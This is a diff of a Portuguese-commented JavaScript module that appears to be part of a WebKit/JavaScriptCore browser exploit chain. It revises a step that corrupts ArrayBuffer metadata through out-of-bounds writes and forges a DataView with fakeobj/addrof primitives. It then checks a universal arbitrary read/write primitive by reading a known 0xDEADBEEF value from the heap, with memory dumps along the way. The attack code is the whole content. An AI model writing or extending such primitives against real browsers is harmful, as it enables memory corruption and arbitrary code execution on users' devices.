@@ -1,7 +1,7 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v30 - Otimização de Log e Foco na FASE 3)
+// js/script3/testArrayBufferVictimCrash.mjs (v31 - Teste de Esqueleto com Leitura Real e Otimização de Log)
 // =======================================================================================
-// ESTA VERSÃO REDUZ A VERBOSIDADE DO LOG E AS PAUSAS, FOCANDO NA DEPURACAO DA FASE 3.
-// FOCO: Otimizar o desempenho do teste e manter o foco na falha do DataView forjado.
+// ESTA VERSÃO OTIMIZA A VERBOSIDADE DO LOG E AJUSTA O TESTE DE SUCESSO DO ESQUELETO ARB R/W.
+// FOCO: Usar uma leitura arbitrária real para validar o esqueleto, e reduzir o overhead.
 // =======================================================================================
 
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
@@ -17,19 +17,20 @@ import {
     selfTestOOBReadWrite,
     oob_read_absolute,
     oob_write_absolute,
-    setupOOBMetadataForArbitraryAccess // Importar a nova função
+    setupOOBMetadataForArbitraryAccess,
+    arb_read_universal_js_heap, // Importar explicitamente a primitiva universal
+    arb_write_universal_js_heap  // Importar explicitamente a primitiva universal
 } from '../core_exploit.mjs';
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE = "v30 - Otimização de Log e Foco na FASE 3"; // Versão atualizada
+export const FNAME_MODULE = "v31 - Teste de Esqueleto com Leitura Real e Otimização"; // Versão atualizada
 
-// Ajustando pausas: mantendo algumas mas reduzindo as muito curtas e excessivas
-const LOCAL_VERY_SHORT_PAUSE = 5; // Reduzido
-const LOCAL_SHORT_PAUSE = 50;    // Reduzido
-const LOCAL_MEDIUM_PAUSE = 250;  // Reduzido
-const LOCAL_LONG_PAUSE = 500;    // Reduzido
-const LOCAL_SHORT_SHORT_PAUSE = 25; // Reduzido
+// Ajustando pausas: mais curtas, ou padrão se não especificado
+const LOCAL_VERY_SHORT_PAUSE = 5;
+const LOCAL_SHORT_PAUSE = 25;
+const LOCAL_MEDIUM_PAUSE = 100;
+const LOCAL_LONG_PAUSE = 200;
 
 const EXPECTED_BUTTERFLY_ELEMENT_SIZE = 8; // Constante para JSValue (8 bytes)
 
@@ -41,8 +42,6 @@ let _backing_array_buffer_for_fake_dv = null; // ArrayBuffer real que será type
 
 // Funções Auxiliares Comuns (dumpMemory)
 async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
-    // Reduzir logs de debug para dumps muito grandes, a menos que seja crítico
-    // logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
     const bytesPerRow = 16;
     let dumpLines = [];
     for (let i = 0; i < size; i += bytesPerRow) {
@@ -60,7 +59,6 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
                 } catch (e) {
                     hexLine += "?? ";
                     asciiLine += "?";
-                    // logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error"); // Remover log por byte, manter para toda a linha
                     for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                     break;
                 }
@@ -71,8 +69,13 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
         }
         dumpLines.push(`[${sourceName}] ${hexLine}${asciiLine}`);
     }
-    dumpLines.forEach(line => logFn(line, "leak")); // Logar todas as linhas de uma vez como "leak"
-    // logFn(`[${sourceName}] Fim do dump.`, "debug");
+    if (dumpLines.length > 0) {
+        logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
+        dumpLines.forEach(line => logFn(line, "leak"));
+        logFn(`[${sourceName}] Fim do dump.`, "debug");
+    } else {
+        logFn(`[${sourceName}] Nenhum byte para dumpar em ${address.toString(true)} (tamanho ${size}).`, "debug");
+    }
 }
 
 /**
@@ -82,7 +85,7 @@ async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") 
  * @param {Function} pauseFn Função de pausa.
  * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
  * @param {number} m_mode_to_try O valor de m_mode a ser testado para o DataView forjado.
- * @returns {Promise<boolean>} True se o esqueleto foi configurado e um teste básico de corrupção de metadados funcionar.
+ * @returns {Promise<boolean>} True se o esqueleto foi configurado e um teste de leitura/escrita real funcionar.
  */
 async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFSETS_PARAM, m_mode_to_try) {
     const FNAME = "setupUniversalArbitraryReadWriteSkeleton";
@@ -101,10 +104,9 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await pauseFn(LOCAL_VERY_SHORT_PAUSE);
 
         // DUMP 1: Conteúdo do backing_array_buffer_for_fake_dv antes da corrupção inicial.
-        // ESSENCIAL PARA ENTENDER LAYOUT E ONDE ESCREVER
         logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) ANTES da corrupção inicial (primeiros 0x60 bytes):`, "debug");
         await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_Before`); // Usar arb_read (old primitive)
-        await pauseFn(LOCAL_SHORT_PAUSE); // Pausa mais longa para visualização
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Corromper os metadados do ArrayBuffer de apoio para fazê-lo se parecer com um DataView.
         logFn(`[${FNAME}] Escrevendo Structure Pointer com Zero (OFFSET: ${toHex(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET)})...`, "info", FNAME);
@@ -129,7 +131,7 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         // DUMP 2: Conteúdo do backing_array_buffer_for_fake_dv APÓS a corrupção inicial.
         logFn(`[${FNAME}] DEBUG: Dump do backing_array_buffer_for_fake_dv (0x${toHex(backing_ab_addr.low())}) APÓS todas as corrupções iniciais:`, "debug");
         await dumpMemory(backing_ab_addr, 0x60, logFn, arb_read, `${FNAME}_BackingAB_AfterCorruption`); // Usar arb_read
-        await pauseFn(LOCAL_SHORT_PAUSE); // Pausa mais longa para visualização
+        await pauseFn(LOCAL_SHORT_PAUSE);
 
         // Forjar o DataView a partir do endereço do ArrayBuffer corrompido.
         logFn(`[${FNAME}] Chamando fakeobj_core para forjar o DataView a partir de ${backing_ab_addr.toString(true)}...`, "info", FNAME);
@@ -149,23 +151,30 @@ async function setupUniversalArbitraryReadWriteSkeleton(logFn, pauseFn, JSC_OFFS
         await dumpMemory(fake_dv_addr, 0x60, logFn, arb_read, `${FNAME}_FakeDV_AfterSkeleton`); // Usar arb_read
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Teste Básico: tentar ler o byteLength do fake_data_view.
-        logFn(`[${FNAME}] Verificando byteLength do fake DataView...`, "info", FNAME);
+        // NOVO TESTE DE SUCESSO: Tentar usar a primitiva Universal ARB R/W para ler um valor conhecido
+        logFn(`[${FNAME}] Testando a L/E Arbitrária Universal (esqueleto) com uma leitura de valor conhecido...`, "info", FNAME);
+        const test_target_js_object_for_skeleton_test = { test_prop_skeleton: 0xDEADBEEF };
+        hold_objects.push(test_target_js_object_for_skeleton_test);
+        const test_target_addr_for_skeleton_test = addrof_core(test_target_js_object_for_skeleton_test);
+
         try {
-            const current_byte_length = _fake_data_view.byteLength;
-            logFn(`[${FNAME}] Teste de leitura de byteLength do fake DV (esqueleto): ${current_byte_length}.`, "debug", FNAME);
-            if (current_byte_length === 0xFFFFFFFF) { // Se o length for expandido
-                 logFn(`[${FNAME}] Esqueleto ARB R/W UNIVERSAL aparentemente configurado.`, "good", FNAME);
-                 success = true; // Define sucesso como true
-                 return true;
+            // Tenta ler a propriedade do objeto de teste usando a recém-forjada primitiva universal
+            const read_val_skeleton = await arb_read_universal_js_heap(
+                test_target_addr_for_skeleton_test.add(JSC_OFFSETS_PARAM.JSObject.BUTTERFLY_OFFSET + EXPECTED_BUTTERFLY_ELEMENT_SIZE * 0),
+                4,
+                logFn
+            );
+
+            if (read_val_skeleton === test_target_js_object_for_skeleton_test.test_prop_skeleton) {
+                logFn(`[${FNAME}] SUCESSO: L/E Arbitrária Universal (esqueleto) FUNCIONANDO! Lido: ${toHex(read_val_skeleton)}.`, "good", FNAME);
+                success = true; // Define sucesso como true
             } else {
-                 logFn(`[${FNAME}] ALERTA: Teste básico de byteLength do fake DV falhou. Esperado 0xFFFFFFFF, lido ${current_byte_length}.`, "warn", FNAME);
-                 return false;
+                logFn(`[${FNAME}] ALERTA: Teste de L/E Arbitrária Universal (esqueleto) falhou. Lido: ${toHex(read_val_skeleton)}, Esperado: ${toHex(test_target_js_object_for_skeleton_test.test_prop_skeleton)}.`, "warn", FNAME);
             }
         } catch (e) {
-            logFn(`[${FNAME}] ERRO: Teste básico de acesso ao fake DV (esqueleto) falhou: ${e.message}`, "error", FNAME);
-            return false;
+            logFn(`[${FNAME}] ERRO CRÍTICO: Teste de L/E Arbitrária Universal (esqueleto) causou exceção: ${e.message}\n${e.stack || ''}`, "error", FNAME);
         }
+        return success; // Retorna o resultado do teste
         
     } catch (e) {
         logFn(`[${FNAME}] ERRO durante configuração do esqueleto de L/E Universal: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
